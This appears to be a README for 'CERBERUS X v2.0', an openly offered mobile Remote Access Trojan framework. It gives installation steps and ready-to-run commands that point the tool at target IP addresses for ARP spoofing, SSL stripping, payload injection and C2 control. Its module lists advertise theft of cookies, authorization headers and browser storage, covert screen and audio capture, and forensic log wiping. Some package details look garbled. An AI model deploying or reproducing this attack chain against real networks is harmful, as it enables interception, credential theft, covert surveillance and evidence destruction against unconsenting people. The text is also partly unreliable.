CERBERUS X v2.0
Advanced Mobile RAT Framework - Red Team Edition
https://img.shields.io/badge/License-MIT-yellow.svg
https://img.shields.io/badge/python-3.8+-blue.svg
https://img.shields.io/badge/node.js-14+-green.svg
https://img.shields.io/badge/platform-Linux%2520%257C%2520macOS%2520%257C%2520Windows-lightgrey

📖 Table of Contents
Overview

Features

Architecture

Installation

Quick Start

Modules

Attack Chain

Configuration

Usage Guide

Payload Development

Defensive Considerations

Comparison with Commercial Tools

Roadmap

Contributing

License

Disclaimer

🎯 Overview
CERBERUS X v2.0 is an advanced Mobile RAT (Remote Access Trojan) Framework designed for professional Red Team operations and mobile security testing. Inspired by commercial solutions like Pegasus (NSO Group) and open-source projects like Amyth, Cerberus X brings enterprise-grade capabilities to the security community - completely free and open source.

Core Philosophy
"Democratizing mobile security testing - making professional-grade tools accessible to everyone."

# Multi-layer attack chain
1. Reconnaissance (Passive & Active)
2. Network Positioning (ARP Spoofing)
3. SSL/TLS Downgrade (HSTS Bypass)
4. Payload Injection (MITM)
5. Persistence (Service Worker)
6. Data Exfiltration (Vault Cracker)
7. Surveillance (Screen Mirror)
8. Cleanup (Forensic Removal)


# System Requirements
- Linux (Kali/Ubuntu/Debian recommended)
- Python 3.8+
- Node.js 14+
- Root privileges
- Network interface with monitor mode support

# Required Packages
sudo apt-get update
sudo apt-get install -y \
    python3-pip \
    python3-scapy \
    nodejs \
    npm \
    hostapd \
    dnsmasq \
    airmon-ng \
    iptables \
    sslstrip \
    build-essential \
    net-tools****

    # 1. Clone repository
git clone https://github.com/F1REW0LF/Cerberus-X.git
cd Cerberus-X

# 2. Install Python dependencies
pip3 install -r requirements.txt

# 3. Install Node dependencies
cd c2_infrastructure
npm install ws express
cd ..

# 4. Make scripts executable
chmod +x deploy_hell_v2.sh

# 5. Generate SSL certificates
openssl req -x509 -newkey rsa:4096 -keyout /etc/ssl/private/cerberus.key \
    -out /etc/ssl/certs/cerberus.crt -days 365 -nodes \
    -subj "/C=US/ST=State/L=City/O=Organization/CN=cerberus.local"

    🚀 Quick Start
One-Click Deployment
bash
# Full auto deployment
sudo ./deploy_hell_v2.sh -t 192.168.1.100

# With custom gateway
sudo ./deploy_hell_v2.sh -t 192.168.1.100 -g 192.168.1.1

# Stealth mode
sudo ./deploy_hell_v2.sh -t 192.168.1.100 -s
Interactive Mode
bash
# Launch interactive menu
sudo ./deploy_hell_v2.sh

# Then select from menu:
1. Full Auto - Deploy everything
2. Recon Only - Network discovery
3. Inject Only - Payload injection
4. Dashboard - Open C2 dashboard
5. Cleanup - Stop all processes
6. Exit - Exit framework
Manual Deployment
bash
# 1. Start C2 Server
cd c2_infrastructure
node central_brain.js &
cd ..

# 2. Start Recon Scanner
python3 kernel_core/recon_scanner.py -i wlan0

# 3. Start Interceptor (in new terminal)
python3 kernel_core/interceptor_v3.py -t 192.168.1.100 -g 192.168.1.1

# 4. Start Injector (in new terminal)
python3 kernel_core/injector_v4.py 192.168.1.100 192.168.1.50

# 5. Open Dashboard
xdg-open "https://$(hostname -I | awk '{print $1}'):8443"

# 6. Cleanup
python3 kernel_core/traffic_cleaner.py --stealth --deep
📚 Modules
1. C2 Infrastructure
central_brain.js
javascript
// Secure WebSocket server with:
- WSS support (SSL/TLS)
- Authentication system
- Database persistence
- Real-time broadcasting
- Multiple client support
- Logging system
dashboard_v3.html
html
// Professional monitoring dashboard:
- Real-time target list
- Live console logs
- Video streaming view
- Statistics and metrics
- Keyboard shortcuts
- Fullscreen mode
2. Kernel Core
recon_scanner.py
python
# Network discovery with:
- DHCP hostname detection
- HTTP User-Agent parsing
- mDNS service discovery
- ARP scanning
- OS fingerprinting
- Mobile device detection
- Multiple interface support
interceptor_v3.py
python
# Network interception with:
- ARP spoofing
- IPv6 neighbor poisoning
- ICMP redirection
- Stealth mode
- IP forwarding
- iptables configuration
- Automatic restoration
injector_v4.py
python
# Payload injection with:
- HTTPS inspection
- SSL/TLS interception
- HSTS bypass
- Payload encryption
- Multiple injection points
- Proxy server
- Automatic cleanup
ssl_bypass_v2.py
python
# SSL/TLS downgrade with:
- SSLStrip implementation
- HSTS bypass (Superfish method)
- HTTP proxy
- Traffic analysis
- Connection logging
- Automatic cleanup
traffic_cleaner.py
python
# Forensic cleaning with:
- iptables flush
- ARP cache clear
- DNS cache clear
- System log sanitization
- Process killing
- Secure file deletion
- Network state restoration
3. Payload Factory
ghost_sw_v2.js
javascript
// Service Worker payload with:
- Request interception
- Authorization header exfil
- POST data capture
- Cache hijacking
- Background sync
- Push notifications
- Self-destruct capability
vault_cracker_v2.js
javascript
// Data exfiltration with:
- LocalStorage extraction
- SessionStorage capture
- Cookie theft
- IndexedDB enumeration
- Browser fingerprinting
- Canvas fingerprint
- Multiple exfil channels
live_mirror_v2.js
javascript
// Screen mirroring with:
- WebRTC streaming
- Screen capture
- Audio capture
- Automatic reconnection
- Quality control
- Audio toggle
- UI controls

